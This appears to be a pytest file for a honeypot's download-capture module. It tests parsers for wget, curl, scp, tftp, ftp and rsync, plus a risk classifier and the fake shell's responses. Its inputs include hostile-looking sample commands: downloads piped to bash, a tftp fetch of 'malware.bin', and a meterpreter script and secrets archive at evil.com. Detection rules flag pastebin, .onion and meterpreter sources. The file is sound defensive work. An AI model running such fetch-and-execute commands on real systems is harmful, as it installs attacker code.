"""Tests for the download capture module."""

import pytest

from miragepot.download_capture import (
    DownloadAttempt,
    parse_wget_command,
    parse_curl_command,
    parse_scp_command,
    parse_tftp_command,
    parse_ftp_command,
    parse_rsync_command,
    detect_download_attempt,
    is_download_command,
    extract_urls_from_command,
    get_url_domain,
    classify_download_risk,
)


class TestDownloadAttempt:
    """Tests for the DownloadAttempt dataclass."""

    def test_to_dict(self):
        """Test conversion to dictionary."""
        attempt = DownloadAttempt(
            tool="wget",
            source="http://example.com/file.sh",
            destination="/tmp/file.sh",
            raw_command="wget -O /tmp/file.sh http://example.com/file.sh",
            flags=["-q"],
            method="GET",
        )
        result = attempt.to_dict()

        assert result["tool"] == "wget"
        assert result["source"] == "http://example.com/file.sh"
        assert result["destination"] == "/tmp/file.sh"
        assert (
            result["raw_command"] == "wget -O /tmp/file.sh http://example.com/file.sh"
        )
        assert result["flags"] == ["-q"]
        assert result["method"] == "GET"
        assert "timestamp" in result

    def test_defaults(self):
        """Test default values."""
        attempt = DownloadAttempt(tool="wget", source="http://example.com")
        assert attempt.destination is None
        assert attempt.raw_command == ""
        assert attempt.flags == []
        assert attempt.method is None


class TestParseWget:
    """Tests for wget command parsing."""

    def test_simple_url(self):
        """Test basic wget with URL."""
        result = parse_wget_command("wget http://example.com/file.txt")
        assert result is not None
        assert result.tool == "wget"
        assert result.source == "http://example.com/file.txt"
        assert result.destination is None

    def test_output_file_short(self):
        """Test wget -O output."""
        result = parse_wget_command("wget -O output.sh http://example.com/script.sh")
        assert result is not None
        assert result.source == "http://example.com/script.sh"
        assert result.destination == "output.sh"

    def test_output_file_long(self):
        """Test wget --output-document."""
        result = parse_wget_command(
            "wget --output-document=script.sh http://example.com/file"
        )
        assert result is not None
        assert result.destination == "script.sh"

    def test_quiet_mode(self):
        """Test quiet flag detection."""
        result = parse_wget_command("wget -q http://example.com/file")
        assert result is not None
        assert "-q" in result.flags

    def test_pipe_to_bash(self):
        """Test wget piped to bash."""
        result = parse_wget_command("wget -O- http://example.com/script | bash")
        assert result is not None
        assert result.source == "http://example.com/script"
        assert result.destination == "stdout (piped)"

    def test_https_url(self):
        """Test HTTPS URL."""
        result = parse_wget_command("wget https://secure.example.com/file")
        assert result is not None
        assert result.source == "https://secure.example.com/file"

    def test_ftp_url(self):
        """Test FTP URL."""
        result = parse_wget_command("wget ftp://ftp.example.com/pub/file.tar.gz")
        assert result is not None
        assert result.source == "ftp://ftp.example.com/pub/file.tar.gz"

    def test_directory_prefix(self):
        """Test -P directory prefix."""
        result = parse_wget_command("wget -P /tmp http://example.com/file.txt")
        assert result is not None
        assert result.destination == "/tmp"

    def test_continue_flag(self):
        """Test continue flag."""
        result = parse_wget_command("wget -c http://example.com/large.zip")
        assert result is not None
        assert "-c" in result.flags

    def test_no_url_returns_none(self):
        """Test wget without URL returns None."""
        result = parse_wget_command("wget -q -O output.txt")
        assert result is None

    def test_not_wget_returns_none(self):
        """Test non-wget command returns None."""
        result = parse_wget_command("curl http://example.com")
        assert result is None

    def test_attached_output_flag(self):
        """Test -Ofilename (attached)."""
        result = parse_wget_command("wget -Ooutput.sh http://example.com/s.sh")
        assert result is not None
        assert result.destination == "output.sh"


class TestParseCurl:
    """Tests for curl command parsing."""

    def test_simple_url(self):
        """Test basic curl with URL."""
        result = parse_curl_command("curl http://example.com/api")
        assert result is not None
        assert result.tool == "curl"
        assert result.source == "http://example.com/api"
        assert result.destination is None

    def test_output_file_short(self):
        """Test curl -o output."""
        result = parse_curl_command("curl -o output.json http://example.com/data")
        assert result is not None
        assert result.destination == "output.json"

    def test_remote_name(self):
        """Test curl -O (remote name)."""
        result = parse_curl_command("curl -O http://example.com/file.tar.gz")
        assert result is not None
        assert result.destination == "[remote filename]"

    def test_follow_redirects(self):
        """Test -L flag detection."""
        result = parse_curl_command("curl -L http://example.com/redirect")
        assert result is not None
        assert "-L" in result.flags

    def test_silent_mode(self):
        """Test silent flag."""
        result = parse_curl_command("curl -s http://example.com/api")
        assert result is not None
        assert "-s" in result.flags

    def test_http_method(self):
        """Test HTTP method detection."""
        result = parse_curl_command("curl -X POST http://example.com/api")
        assert result is not None
        assert result.method == "POST"

    def test_http_method_attached(self):
        """Test attached HTTP method."""
        result = parse_curl_command("curl -XDELETE http://example.com/resource")
        assert result is not None
        assert result.method == "DELETE"

    def test_default_method_is_get(self):
        """Test default method is GET."""
        result = parse_curl_command("curl http://example.com")
        assert result is not None
        assert result.method == "GET"

    def test_data_flag(self):
        """Test data flag detection."""
        result = parse_curl_command('curl -d "data" http://example.com/api')
        assert result is not None
        assert "-d" in result.flags

    def test_output_with_equals(self):
        """Test --output=filename."""
        result = parse_curl_command("curl --output=data.json http://example.com/api")
        assert result is not None
        assert result.destination == "data.json"

    def test_not_curl_returns_none(self):
        """Test non-curl command returns None."""
        result = parse_curl_command("wget http://example.com")
        assert result is None


class TestParseScp:
    """Tests for scp command parsing."""

    def test_remote_to_local(self):
        """Test remote to local copy."""
        result = parse_scp_command("scp user@host:/path/file.txt /local/")
        assert result is not None
        assert result.tool == "scp"
        assert result.source == "user@host:/path/file.txt"
        assert result.destination == "/local/"

    def test_local_to_remote(self):
        """Test local to remote copy."""
        result = parse_scp_command("scp /local/file.txt user@host:/remote/")
        assert result is not None
        assert result.source == "/local/file.txt"
        assert result.destination == "user@host:/remote/"

    def test_recursive_flag(self):
        """Test recursive flag."""
        result = parse_scp_command("scp -r user@host:/dir /local/")
        assert result is not None
        assert "-r" in result.flags

    def test_port_flag(self):
        """Test port flag."""
        result = parse_scp_command("scp -P 2222 user@host:file ./")
        assert result is not None
        assert "-P 2222" in result.flags

    def test_single_path(self):
        """Test incomplete command with single path."""
        result = parse_scp_command("scp user@host:file")
        assert result is not None
        assert result.source == "user@host:file"
        assert result.destination is None

    def test_not_scp_returns_none(self):
        """Test non-scp command returns None."""
        result = parse_scp_command("rsync user@host:/path /local/")
        assert result is None


class TestParseTftp:
    """Tests for tftp command parsing."""

    def test_get_with_flags(self):
        """Test tftp get mode."""
        result = parse_tftp_command("tftp -g -r remotefile 192.168.1.1")
        assert result is not None
        assert result.tool == "tftp"
        assert "192.168.1.1" in result.source
        assert result.method == "get"

    def test_command_mode(self):
        """Test tftp -c command."""
        result = parse_tftp_command("tftp 192.168.1.1 -c get malware.bin")
        assert result is not None
        assert result.method == "get"
        assert "malware.bin" in result.source

    def test_put_mode(self):
        """Test tftp put mode."""
        result = parse_tftp_command("tftp -p -l localfile 192.168.1.1")
        assert result is not None
        assert result.method == "put"

    def test_binary_mode(self):
        """Test binary mode flag."""
        result = parse_tftp_command("tftp -i 192.168.1.1 GET file")
        assert result is not None
        assert "-i" in result.flags

    def test_no_host_returns_none(self):
        """Test tftp without host returns None."""
        result = parse_tftp_command("tftp -g -r file")
        assert result is None

    def test_not_tftp_returns_none(self):
        """Test non-tftp command returns None."""
        result = parse_tftp_command("ftp 192.168.1.1")
        assert result is None


class TestParseFtp:
    """Tests for ftp command parsing."""

    def test_simple_host(self):
        """Test basic ftp with host."""
        result = parse_ftp_command("ftp ftp.example.com")
        assert result is not None
        assert result.tool == "ftp"
        assert result.source == "ftp://ftp.example.com"

    def test_user_at_host(self):
        """Test ftp with user@host."""
        result = parse_ftp_command("ftp user@ftp.example.com")
        assert result is not None
        assert "user@ftp.example.com" in result.source

    def test_no_auto_login(self):
        """Test -n flag."""
        result = parse_ftp_command("ftp -n ftp.example.com")
        assert result is not None
        assert "-n" in result.flags

    def test_no_host_returns_none(self):
        """Test ftp without host returns None."""
        result = parse_ftp_command("ftp -n")
        assert result is None

    def test_not_ftp_returns_none(self):
        """Test non-ftp command returns None."""
        result = parse_ftp_command("sftp host")
        assert result is None


class TestParseRsync:
    """Tests for rsync command parsing."""

    def test_remote_to_local(self):
        """Test remote to local sync."""
        result = parse_rsync_command("rsync -avz user@host:/path/ /local/")
        assert result is not None
        assert result.tool == "rsync"
        assert result.source == "user@host:/path/"
        assert result.destination == "/local/"

    def test_flags(self):
        """Test flag detection."""
        result = parse_rsync_command("rsync -avz --progress source dest")
        assert result is not None
        assert "-avz" in result.flags
        assert "--progress" in result.flags

    def test_single_path(self):
        """Test incomplete command with single path."""
        result = parse_rsync_command("rsync -avz user@host:/path/")
        assert result is not None
        assert result.source == "user@host:/path/"
        assert result.destination is None

    def test_not_rsync_returns_none(self):
        """Test non-rsync command returns None."""
        result = parse_rsync_command("scp user@host:/path/ /local/")
        assert result is None


class TestDetectDownloadAttempt:
    """Tests for the unified download detection function."""

    def test_wget(self):
        """Test wget detection."""
        result = detect_download_attempt("wget http://example.com/file")
        assert result is not None
        assert result.tool == "wget"

    def test_curl(self):
        """Test curl detection."""
        result = detect_download_attempt("curl http://example.com/api")
        assert result is not None
        assert result.tool == "curl"

    def test_scp(self):
        """Test scp detection."""
        result = detect_download_attempt("scp user@host:file ./")
        assert result is not None
        assert result.tool == "scp"

    def test_tftp(self):
        """Test tftp detection."""
        result = detect_download_attempt("tftp 192.168.1.1 -c get file")
        assert result is not None
        assert result.tool == "tftp"

    def test_ftp(self):
        """Test ftp detection."""
        result = detect_download_attempt("ftp ftp.example.com")
        assert result is not None
        assert result.tool == "ftp"

    def test_rsync(self):
        """Test rsync detection."""
        result = detect_download_attempt("rsync -avz host:/path/ ./")
        assert result is not None
        assert result.tool == "rsync"

    def test_non_download_returns_none(self):
        """Test non-download command returns None."""
        result = detect_download_attempt("ls -la")
        assert result is None

    def test_empty_returns_none(self):
        """Test empty command returns None."""
        result = detect_download_attempt("")
        assert result is None
        result = detect_download_attempt("   ")
        assert result is None


class TestIsDownloadCommand:
    """Tests for quick download command check."""

    def test_wget(self):
        assert is_download_command("wget http://x") is True

    def test_curl(self):
        assert is_download_command("curl http://x") is True

    def test_scp(self):
        assert is_download_command("scp a b") is True

    def test_tftp(self):
        assert is_download_command("tftp host") is True

    def test_ftp(self):
        assert is_download_command("ftp host") is True

    def test_rsync(self):
        assert is_download_command("rsync a b") is True

    def test_ls(self):
        assert is_download_command("ls -la") is False

    def test_empty(self):
        assert is_download_command("") is False


class TestExtractUrls:
    """Tests for URL extraction."""

    def test_single_http_url(self):
        """Test single HTTP URL extraction."""
        urls = extract_urls_from_command("wget http://example.com/file")
        assert urls == ["http://example.com/file"]

    def test_single_https_url(self):
        """Test single HTTPS URL extraction."""
        urls = extract_urls_from_command("curl https://secure.example.com/api")
        assert urls == ["https://secure.example.com/api"]

    def test_multiple_urls(self):
        """Test multiple URLs extraction."""
        urls = extract_urls_from_command("wget http://a.com/1 http://b.com/2")
        assert len(urls) == 2
        assert "http://a.com/1" in urls
        assert "http://b.com/2" in urls

    def test_ftp_url(self):
        """Test FTP URL extraction."""
        urls = extract_urls_from_command("wget ftp://ftp.example.com/file")
        assert urls == ["ftp://ftp.example.com/file"]

    def test_no_urls(self):
        """Test command with no URLs."""
        urls = extract_urls_from_command("ls -la /home")
        assert urls == []

    def test_url_with_trailing_punctuation(self):
        """Test URL with trailing punctuation is cleaned."""
        urls = extract_urls_from_command('echo "http://example.com/file"')
        assert "http://example.com/file" in urls


class TestGetUrlDomain:
    """Tests for domain extraction."""

    def test_http_domain(self):
        """Test HTTP domain extraction."""
        assert get_url_domain("http://example.com/path") == "example.com"

    def test_https_domain(self):
        """Test HTTPS domain extraction."""
        assert get_url_domain("https://secure.example.com/api") == "secure.example.com"

    def test_domain_with_port(self):
        """Test domain with port."""
        assert get_url_domain("http://example.com:8080/path") == "example.com:8080"

    def test_no_protocol(self):
        """Test URL without protocol."""
        # urlparse handles this differently
        result = get_url_domain("example.com/path")
        assert result is not None  # May be path-based


class TestClassifyDownloadRisk:
    """Tests for download risk classification."""

    def test_critical_pastebin(self):
        """Test critical: pastebin raw."""
        attempt = DownloadAttempt(
            tool="wget",
            source="https://pastebin.com/raw/abc123",
        )
        assert classify_download_risk(attempt) == "critical"

    def test_critical_onion(self):
        """Test critical: .onion domain."""
        attempt = DownloadAttempt(
            tool="curl",
            source="http://abc123.onion/payload",
        )
        assert classify_download_risk(attempt) == "critical"

    def test_critical_meterpreter(self):
        """Test critical: meterpreter keyword."""
        attempt = DownloadAttempt(
            tool="wget",
            source="http://evil.com/meterpreter.sh",
        )
        assert classify_download_risk(attempt) == "critical"

    def test_high_shell_script(self):
        """Test high: shell script download."""
        attempt = DownloadAttempt(
            tool="wget",
            source="http://example.com/install.sh",
        )
        assert classify_download_risk(attempt) == "high"

    def test_high_piped_to_bash(self):
        """Test high: piped to bash."""
        attempt = DownloadAttempt(
            tool="curl",
            source="http://example.com/script",
            raw_command="curl http://example.com/script | bash",
        )
        assert classify_download_risk(attempt) == "high"

    def test_high_scp_remote(self):
        """Test high: scp from remote host."""
        attempt = DownloadAttempt(
            tool="scp",
            source="attacker@evil.com:/data/secrets.tar.gz",
        )
        assert classify_download_risk(attempt) == "high"

    def test_high_executable(self):
        """Test high: executable download."""
        attempt = DownloadAttempt(
            tool="wget",
            source="http://example.com/binary.elf",
        )
        assert classify_download_risk(attempt) == "high"

    def test_medium_tarball(self):
        """Test medium: tarball download."""
        attempt = DownloadAttempt(
            tool="wget",
            source="http://example.com/data.tar.gz",
        )
        assert classify_download_risk(attempt) == "medium"

    def test_medium_zip(self):
        """Test medium: zip download."""
        attempt = DownloadAttempt(
            tool="curl",
            source="http://example.com/archive.zip",
        )
        assert classify_download_risk(attempt) == "medium"

    def test_low_default(self):
        """Test low: default for unknown."""
        attempt = DownloadAttempt(
            tool="curl",
            source="http://example.com/data.json",
        )
        assert classify_download_risk(attempt) == "low"


class TestIntegrationWithCommandHandler:
    """Integration tests with command_handler module."""

    def test_wget_creates_file(self):
        """Test wget creates fake file in filesystem."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command("wget http://example.com/script.sh", state)

        # Should have download attempt recorded
        assert len(state["download_attempts"]) == 1
        assert state["download_attempts"][0]["tool"] == "wget"
        assert state["download_attempts"][0]["source"] == "http://example.com/script.sh"

        # Should have created fake file
        assert "/root/script.sh" in state["files"]

    def test_curl_with_output(self):
        """Test curl -o creates file."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command(
            "curl -o /tmp/data.json http://example.com/api", state
        )

        assert len(state["download_attempts"]) == 1
        assert state["download_attempts"][0]["destination"] == "/tmp/data.json"
        assert "/tmp/data.json" in state["files"]

    def test_curl_silent_no_output_file(self):
        """Test curl without output file returns content."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command("curl http://example.com/api", state)

        # Should return HTML-like content
        assert "<html>" in response.lower() or "<!doctype" in response.lower()

    def test_scp_records_attempt(self):
        """Test scp records download attempt."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command("scp user@host:/data/file.txt ./", state)

        assert len(state["download_attempts"]) == 1
        assert state["download_attempts"][0]["tool"] == "scp"

    def test_multiple_downloads(self):
        """Test multiple download commands accumulate."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        handle_command("wget http://a.com/1", state)
        handle_command("curl http://b.com/2", state)
        handle_command("scp user@host:file ./", state)

        assert len(state["download_attempts"]) == 3

    def test_wget_quiet_mode(self):
        """Test wget -q produces no output."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command("wget -q http://example.com/file", state)

        assert response == ""
        assert len(state["download_attempts"]) == 1

    def test_ftp_shows_connection(self):
        """Test ftp shows connection prompt."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        response = handle_command("ftp ftp.example.com", state)

        assert "Connected to" in response
        assert "ftp.example.com" in response
